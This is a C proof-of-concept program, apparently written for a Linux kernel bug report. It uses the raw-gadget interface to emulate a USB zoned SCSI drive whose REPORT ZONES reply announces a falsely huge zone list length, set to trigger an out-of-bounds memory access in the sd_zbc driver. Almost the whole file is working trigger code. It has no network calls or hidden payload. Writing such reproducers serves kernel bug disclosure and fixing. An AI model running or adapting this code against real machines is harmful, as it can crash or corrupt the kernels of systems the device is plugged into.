// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <linux/types.h>
#include <linux/usb/ch9.h>
#include <linux/usb/raw_gadget.h>

#define LB_SIZE		512ULL
#define ZONE_BLOCKS	0x10000ULL
#define NR_ZONES	23ULL
#define CAPACITY_BLK	(ZONE_BLOCKS * NR_ZONES)
#define MAX_LBA		(CAPACITY_BLK - 1)

#define LIED_ZONE_LIST_LENGTH	0x0fffff00u

static void put_be16(unsigned char *p, uint16_t v)
{
	p[0] = v >> 8; p[1] = v;
}

static void put_be32(unsigned char *p, uint32_t v)
{
	p[0] = v >> 24; p[1] = v >> 16; p[2] = v >> 8; p[3] = v;
}

static void put_be64(unsigned char *p, uint64_t v)
{
	int i;
	for (i = 0; i < 8; i++)
		p[i] = (unsigned char)(v >> (56 - 8 * i));
}

static uint32_t get_be32(const unsigned char *p)
{
	return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
	       ((uint32_t)p[2] << 8) | p[3];
}

static uint64_t get_be64(const unsigned char *p)
{
	uint64_t v = 0;
	int i;
	for (i = 0; i < 8; i++)
		v = (v << 8) | p[i];
	return v;
}

static uint32_t get_le32(const unsigned char *p)
{
	return ((uint32_t)p[3] << 24) | ((uint32_t)p[2] << 16) |
	       ((uint32_t)p[1] << 8) | p[0];
}

static void put_le32(unsigned char *p, uint32_t v)
{
	p[0] = v; p[1] = v >> 8; p[2] = v >> 16; p[3] = v >> 24;
}

struct usb_raw_control_event {
	struct usb_raw_event	inner;
	struct usb_ctrlrequest	ctrl;
};

struct usb_raw_ep_io_data {
	struct usb_raw_ep_io	inner;
	unsigned char		data[4096];
};

static int raw_fd = -1;
static int ep_in_handle = -1;
static int ep_out_handle = -1;
static volatile int running;
static int verbose;

static int raw_open(void)
{
	int fd = open("/dev/raw-gadget", O_RDWR);

	if (fd < 0) {
		perror("[-] open(/dev/raw-gadget)");
		exit(1);
	}
	return fd;
}

static void raw_init(int fd, const char *drv, const char *dev, int speed)
{
	struct usb_raw_init arg;

	memset(&arg, 0, sizeof(arg));
	strncpy((char *)arg.driver_name, drv, sizeof(arg.driver_name) - 1);
	strncpy((char *)arg.device_name, dev, sizeof(arg.device_name) - 1);
	arg.speed = speed;
	if (ioctl(fd, USB_RAW_IOCTL_INIT, &arg) < 0) {
		perror("[-] USB_RAW_IOCTL_INIT");
		exit(1);
	}
}

static void raw_run(int fd)
{
	if (ioctl(fd, USB_RAW_IOCTL_RUN, 0) < 0) {
		perror("[-] USB_RAW_IOCTL_RUN");
		exit(1);
	}
}

static void raw_event_fetch(int fd, struct usb_raw_event *event)
{
	if (ioctl(fd, USB_RAW_IOCTL_EVENT_FETCH, event) < 0) {
		perror("[-] USB_RAW_IOCTL_EVENT_FETCH");
		exit(1);
	}
}

static int raw_ep0_write(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, io);
}

static int raw_ep0_read(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, io);
}

static void raw_ep0_stall(int fd)
{
	ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0);
}

static int raw_ep_enable(int fd, struct usb_endpoint_descriptor *desc)
{
	return ioctl(fd, USB_RAW_IOCTL_EP_ENABLE, desc);
}

static int raw_ep_write(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP_WRITE, io);
}

static int raw_ep_read(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP_READ, io);
}

static void raw_configure(int fd)
{
	if (ioctl(fd, USB_RAW_IOCTL_CONFIGURE, 0) < 0)
		perror("[!] USB_RAW_IOCTL_CONFIGURE");
}

static void raw_vbus_draw(int fd, uint32_t power)
{
	ioctl(fd, USB_RAW_IOCTL_VBUS_DRAW, power);
}

static struct usb_device_descriptor dev_desc = {
	.bLength		= USB_DT_DEVICE_SIZE,
	.bDescriptorType	= USB_DT_DEVICE,
	.bcdUSB			= 0x0200,
	.bDeviceClass		= 0,
	.bDeviceSubClass	= 0,
	.bDeviceProtocol	= 0,
	.bMaxPacketSize0	= 64,
	.idVendor		= 0x1d6b,
	.idProduct		= 0x0104,
	.bcdDevice		= 0x0100,
	.iManufacturer		= 0,
	.iProduct		= 0,
	.iSerialNumber		= 0,
	.bNumConfigurations	= 1,
};

static struct usb_config_descriptor cfg_desc = {
	.bLength		= USB_DT_CONFIG_SIZE,
	.bDescriptorType	= USB_DT_CONFIG,
	.wTotalLength		= USB_DT_CONFIG_SIZE + USB_DT_INTERFACE_SIZE +
				  2 * USB_DT_ENDPOINT_SIZE,
	.bNumInterfaces		= 1,
	.bConfigurationValue	= 1,
	.iConfiguration		= 0,
	.bmAttributes		= 0x80,
	.bMaxPower		= 0x32,
};

static struct usb_interface_descriptor intf_desc = {
	.bLength		= USB_DT_INTERFACE_SIZE,
	.bDescriptorType	= USB_DT_INTERFACE,
	.bInterfaceNumber	= 0,
	.bAlternateSetting	= 0,
	.bNumEndpoints		= 2,
	.bInterfaceClass	= 0x08,
	.bInterfaceSubClass	= 0x06,
	.bInterfaceProtocol	= 0x50,
	.iInterface		= 0,
};

static struct usb_endpoint_descriptor ep_bulk_in = {
	.bLength		= USB_DT_ENDPOINT_SIZE,
	.bDescriptorType	= USB_DT_ENDPOINT,
	.bEndpointAddress	= USB_DIR_IN | 1,
	.bmAttributes		= USB_ENDPOINT_XFER_BULK,
	.wMaxPacketSize		= 512,
	.bInterval		= 0,
};

static struct usb_endpoint_descriptor ep_bulk_out = {
	.bLength		= USB_DT_ENDPOINT_SIZE,
	.bDescriptorType	= USB_DT_ENDPOINT,
	.bEndpointAddress	= USB_DIR_OUT | 2,
	.bmAttributes		= USB_ENDPOINT_XFER_BULK,
	.wMaxPacketSize		= 512,
	.bInterval		= 0,
};

static int build_config(unsigned char *out)
{
	int off = 0;

	memcpy(out + off, &cfg_desc, USB_DT_CONFIG_SIZE);
	off += USB_DT_CONFIG_SIZE;
	memcpy(out + off, &intf_desc, USB_DT_INTERFACE_SIZE);
	off += USB_DT_INTERFACE_SIZE;
	memcpy(out + off, &ep_bulk_in, USB_DT_ENDPOINT_SIZE);
	off += USB_DT_ENDPOINT_SIZE;
	memcpy(out + off, &ep_bulk_out, USB_DT_ENDPOINT_SIZE);
	off += USB_DT_ENDPOINT_SIZE;
	return off;
}

static unsigned char sense_key, sense_asc, sense_ascq;

static void set_sense(unsigned char key, unsigned char asc, unsigned char ascq)
{
	sense_key = key;
	sense_asc = asc;
	sense_ascq = ascq;
}

static int build_inquiry_std(unsigned char *out)
{
	memset(out, 0, 36);
	out[0] = 0x14;
	out[1] = 0x00;
	out[2] = 0x06;
	out[3] = 0x02;
	out[4] = 31;
	out[5] = 0x00;
	out[6] = 0x00;
	out[7] = 0x00;
	memcpy(out + 8,  "LINUX   ", 8);
	memcpy(out + 16, "ZBC RAWGADGET   ", 16);
	memcpy(out + 32, "0001", 4);
	return 36;
}

static int build_inquiry_vpd(unsigned char *out, unsigned char page)
{
	switch (page) {
	case 0x00:
		memset(out, 0, 8);
		out[0] = 0x14;
		out[1] = 0x00;
		put_be16(out + 2, 2);
		out[4] = 0x00;
		out[5] = 0xb6;
		return 6;
	case 0xb6: {
		memset(out, 0, 64);
		out[0] = 0x14;
		out[1] = 0xb6;
		put_be16(out + 2, 60);
		out[4] = 0x01;
		put_be32(out + 16, 0);
		out[23] = 0x00;
		return 64;
	}
	default:
		return -1;
	}
}

static int build_read_capacity16(unsigned char *out)
{
	memset(out, 0, 32);
	put_be64(out + 0, MAX_LBA);
	put_be32(out + 8, (uint32_t)LB_SIZE);
	out[12] = 0x00;
	out[13] = 0x00;
	return 32;
}

static int build_read_capacity10(unsigned char *out)
{
	memset(out, 0, 8);
	put_be32(out + 0, (uint32_t)MAX_LBA);
	put_be32(out + 4, (uint32_t)LB_SIZE);
	return 8;
}

static int build_report_zones(const unsigned char *cdb, unsigned char *out,
			      unsigned int alloc_len)
{
	uint64_t zs_lba = get_be64(cdb + 2);
	unsigned int ndesc, i;
	uint64_t lba;

	if (alloc_len > 4096)
		alloc_len = 4096;
	memset(out, 0, alloc_len);

	if (alloc_len < 64)
		return alloc_len;

	put_be32(out + 0, LIED_ZONE_LIST_LENGTH);
	put_be64(out + 8, MAX_LBA);

	ndesc = alloc_len / 64;
	if (ndesc == 0)
		return alloc_len;
	ndesc -= 1;

	lba = zs_lba;
	for (i = 0; i < ndesc; i++) {
		unsigned char *d = out + 64 * (i + 1);

		d[0] = 0x01;
		d[1] = 0x00;
		put_be64(d + 8,  ZONE_BLOCKS);
		put_be64(d + 16, lba);
		put_be64(d + 24, lba);
		lba += ZONE_BLOCKS;
	}

	return 64 * (ndesc + 1);
}

static int build_mode_sense6(unsigned char *out)
{
	memset(out, 0, 4);
	out[0] = 3;
	out[1] = 0;
	out[2] = 0;
	out[3] = 0;
	return 4;
}

static int build_mode_sense10(unsigned char *out)
{
	memset(out, 0, 8);
	put_be16(out + 0, 6);
	return 8;
}

static int build_request_sense(unsigned char *out)
{
	memset(out, 0, 18);
	out[0] = 0x70;
	out[2] = sense_key & 0xf;
	out[7] = 10;
	out[12] = sense_asc;
	out[13] = sense_ascq;
	return 18;
}

static int build_report_luns(unsigned char *out)
{
	memset(out, 0, 16);
	put_be32(out + 0, 8);
	return 16;
}

static int scsi_exec(const unsigned char *cdb, int cdb_len,
		     unsigned char *out, unsigned int alloc_hint)
{
	unsigned int len;

	switch (cdb[0]) {
	case 0x00:
		return 0;
	case 0x03:
		return build_request_sense(out);
	case 0x12:
		if (cdb[1] & 0x01)
			return build_inquiry_vpd(out, cdb[2]);
		return build_inquiry_std(out);
	case 0x1a:
		return build_mode_sense6(out);
	case 0x5a:
		return build_mode_sense10(out);
	case 0x1b:
	case 0x1e:
	case 0x35:
	case 0x91:
		return 0;
	case 0x25:
		return build_read_capacity10(out);
	case 0x9e:
		if ((cdb[1] & 0x1f) == 0x10)
			return build_read_capacity16(out);
		break;
	case 0x95:
		if ((cdb[1] & 0x1f) == 0x00) {
			len = get_be32(cdb + 10);
			if (len > alloc_hint)
				len = alloc_hint;
			return build_report_zones(cdb, out, len);
		}
		break;
	case 0xa0:
		return build_report_luns(out);
	case 0x28:
	case 0x88:
		len = alloc_hint > 4096 ? 4096 : alloc_hint;
		memset(out, 0, len);
		return len;
	default:
		break;
	}

	set_sense(0x05, 0x20, 0x00);
	return -1;
}

#define CBW_SIGNATURE	0x43425355u
#define CSW_SIGNATURE	0x53425355u

static void *bot_thread(void *unused)
{
	static struct usb_raw_ep_io_data io;
	static unsigned char payload[8192];
	(void)unused;

	while (running) {
		unsigned int tag, dlen, i;
		int rc, cdb_len, data_len;
		unsigned char flags, cdb[16];
		unsigned char status = 0;

		io.inner.ep = ep_out_handle;
		io.inner.flags = 0;
		io.inner.length = 512;
		rc = raw_ep_read(raw_fd, (struct usb_raw_ep_io *)&io);
		if (rc < 0) {
			if (errno == ESHUTDOWN || errno == EBUSY ||
			    errno == EINVAL) {
				usleep(1000);
				continue;
			}
			usleep(1000);
			continue;
		}
		if (rc < 31)
			continue;
		if (get_le32(io.data) != CBW_SIGNATURE)
			continue;

		tag = get_le32(io.data + 4);
		dlen = get_le32(io.data + 8);
		flags = io.data[12];
		cdb_len = io.data[14] & 0x1f;
		memset(cdb, 0, sizeof(cdb));
		for (i = 0; i < (unsigned int)cdb_len && i < 16; i++)
			cdb[i] = io.data[15 + i];

		if (verbose)
			printf("[.] cbw op=0x%02x sa=0x%02x dlen=%u flags=0x%02x\n",
			       cdb[0], cdb[1] & 0x1f, dlen, flags);

		data_len = 0;
		if (dlen && !(flags & 0x80)) {

			unsigned int left = dlen;

			while (left) {
				io.inner.ep = ep_out_handle;
				io.inner.flags = 0;
				io.inner.length = left > 512 ? 512 : left;
				rc = raw_ep_read(raw_fd,
						 (struct usb_raw_ep_io *)&io);
				if (rc <= 0)
					break;
				left -= rc;
			}
			data_len = 0;
		} else {
			data_len = scsi_exec(cdb, cdb_len, payload,
					     dlen ? dlen : 64);
			if (data_len < 0) {
				status = 1;
				data_len = 0;
			}
			if ((unsigned int)data_len > dlen)
				data_len = dlen;
			if (data_len > 0) {
				unsigned int sent = 0;

				while (sent < (unsigned int)data_len) {
					unsigned int chunk =
						data_len - sent > 512 ?
						512 : data_len - sent;

					io.inner.ep = ep_in_handle;
					io.inner.flags = 0;
					io.inner.length = chunk;
					memcpy(io.data, payload + sent, chunk);
					rc = raw_ep_write(raw_fd,
						(struct usb_raw_ep_io *)&io);
					if (rc < 0)
						break;
					sent += chunk;
				}
			}

			if ((unsigned int)data_len < dlen &&
			    (data_len % 512) == 0) {
				io.inner.ep = ep_in_handle;
				io.inner.flags = 0;
				io.inner.length = 0;
				raw_ep_write(raw_fd,
					     (struct usb_raw_ep_io *)&io);
			}
		}

		if (status == 0 && cdb[0] != 0x03)
			set_sense(0, 0, 0);

		memset(io.data, 0, 13);
		put_le32(io.data + 0, CSW_SIGNATURE);
		put_le32(io.data + 4, tag);
		put_le32(io.data + 8, dlen - (unsigned int)data_len);
		io.data[12] = status;
		io.inner.ep = ep_in_handle;
		io.inner.flags = 0;
		io.inner.length = 13;
		raw_ep_write(raw_fd, (struct usb_raw_ep_io *)&io);
	}
	return NULL;
}

static pthread_t bot_tid;
static int bot_started;

static void ep0_ack(struct usb_ctrlrequest *ctrl, struct usb_raw_ep_io_data *io,
		    int len)
{
	int rc;

	io->inner.ep = 0;
	io->inner.flags = 0;

	if ((ctrl->bRequestType & USB_DIR_IN) && ctrl->wLength) {
		if (len < 0)
			len = 0;
		if ((unsigned int)len > ctrl->wLength)
			len = ctrl->wLength;
		io->inner.length = len;
		rc = raw_ep0_write(raw_fd, (struct usb_raw_ep_io *)io);
	} else {
		io->inner.length = (ctrl->bRequestType & USB_DIR_IN) ?
			0 : (ctrl->wLength > sizeof(io->data) ?
			     sizeof(io->data) : ctrl->wLength);
		rc = raw_ep0_read(raw_fd, (struct usb_raw_ep_io *)io);
	}
	if (rc < 0)
		printf("[!] ep0 ack failed: req=0x%02x/0x%02x wLength=%u: %s\n",
		       ctrl->bRequestType, ctrl->bRequest, ctrl->wLength,
		       strerror(errno));
}

static void do_set_configuration(struct usb_ctrlrequest *ctrl)
{
	struct usb_raw_ep_io_data io;

	ep_in_handle = raw_ep_enable(raw_fd, &ep_bulk_in);
	if (ep_in_handle < 0) {
		perror("[-] EP_ENABLE(bulk in)");
		exit(1);
	}
	ep_out_handle = raw_ep_enable(raw_fd, &ep_bulk_out);
	if (ep_out_handle < 0) {
		perror("[-] EP_ENABLE(bulk out)");
		exit(1);
	}
	printf("[+] endpoints enabled: in=%d out=%d\n",
	       ep_in_handle, ep_out_handle);
	fflush(stdout);

	raw_vbus_draw(raw_fd, 0x32);
	raw_configure(raw_fd);

	ep0_ack(ctrl, &io, 0);

	if (!bot_started) {
		bot_started = 1;
		running = 1;
		pthread_create(&bot_tid, NULL, bot_thread, NULL);
	}
}

static void handle_control(struct usb_ctrlrequest *ctrl)
{
	struct usb_raw_ep_io_data io;
	int len = -1;

	io.inner.ep = 0;
	io.inner.flags = 0;

	switch (ctrl->bRequestType & USB_TYPE_MASK) {
	case USB_TYPE_STANDARD:
		switch (ctrl->bRequest) {
		case USB_REQ_GET_DESCRIPTOR:
			switch (ctrl->wValue >> 8) {
			case USB_DT_DEVICE:
				memcpy(io.data, &dev_desc, sizeof(dev_desc));
				len = sizeof(dev_desc);
				break;
			case USB_DT_CONFIG:
				len = build_config(io.data);
				break;
			case USB_DT_STRING:
				io.data[0] = 4;
				io.data[1] = USB_DT_STRING;
				io.data[2] = 0x09;
				io.data[3] = 0x04;
				len = 4;
				break;
			default:
				len = -1;
				break;
			}
			break;
		case USB_REQ_SET_CONFIGURATION:
			do_set_configuration(ctrl);
			return;
		case USB_REQ_GET_CONFIGURATION:
			io.data[0] = 1;
			len = 1;
			break;
		case USB_REQ_SET_INTERFACE:
			len = 0;
			break;
		case USB_REQ_GET_INTERFACE:
			io.data[0] = 0;
			len = 1;
			break;
		case USB_REQ_GET_STATUS:
			io.data[0] = 0;
			io.data[1] = 0;
			len = 2;
			break;
		case USB_REQ_SET_ADDRESS:
			len = 0;
			break;
		default:
			len = -1;
			break;
		}
		break;
	case USB_TYPE_CLASS:
		switch (ctrl->bRequest) {
		case 0xfe:
			io.data[0] = 0;
			len = 1;
			break;
		case 0xff:
			len = 0;
			break;
		default:
			len = -1;
			break;
		}
		break;
	default:
		len = -1;
		break;
	}

	if (len < 0) {
		raw_ep0_stall(raw_fd);
		return;
	}

	ep0_ack(ctrl, &io, len);
}

static void *ep0_thread(void *unused)
{
	struct usb_raw_control_event ev;
	(void)unused;

	for (;;) {
		ev.inner.type = 0;
		ev.inner.length = sizeof(ev.ctrl);
		raw_event_fetch(raw_fd, (struct usb_raw_event *)&ev);

		switch (ev.inner.type) {
		case USB_RAW_EVENT_CONNECT:
			printf("[+] gadget connected to dummy_udc\n");
			fflush(stdout);
			break;
		case USB_RAW_EVENT_CONTROL:
			if (verbose)
				printf("[.] ctrl %02x %02x %04x %04x %04x\n",
				       ev.ctrl.bRequestType, ev.ctrl.bRequest,
				       ev.ctrl.wValue, ev.ctrl.wIndex,
				       ev.ctrl.wLength);
			handle_control(&ev.ctrl);
			break;
		default:
			break;
		}
	}
	return NULL;
}

static void run_gadget_once(void)
{
	pthread_t tid;
	int i;

	raw_fd = raw_open();
	raw_init(raw_fd, "dummy_udc", "dummy_udc.0", USB_SPEED_HIGH);
	raw_run(raw_fd);

	pthread_create(&tid, NULL, ep0_thread, NULL);

	for (i = 0; i < 12; i++)
		sleep(1);

	_exit(0);
}

int main(int argc, char **argv)
{
	int round;

	setvbuf(stdout, NULL, _IONBF, 0);
	verbose = (argc > 1);
	(void)argv;

	printf("[*] sd_zbc REPORT ZONES OOB PoC\n");
	printf("[*] geometry: %llu zones x %llu blocks, capacity %llu blocks\n",
	       NR_ZONES, ZONE_BLOCKS, CAPACITY_BLK);
	printf("[*] expected report buffer: roundup((%llu+1)*64, 512) = %llu bytes\n",
	       NR_ZONES, ((NR_ZONES + 1) * 64 + 511) / 512 * 512);
	printf("[*] announced ZONE LIST LENGTH: 0x%08x (%u descriptors)\n",
	       LIED_ZONE_LIST_LENGTH, LIED_ZONE_LIST_LENGTH / 64);

	for (round = 0; round < 3; round++) {
		pid_t pid = fork();

		if (pid < 0) {
			perror("[-] fork");
			break;
		}
		if (pid == 0)
			run_gadget_once();

		printf("[*] round %d: emulated ZBC drive plugged in\n", round);
		waitpid(pid, NULL, 0);
		sleep(2);
	}

	printf("[*] done\n");
	return 0;
}
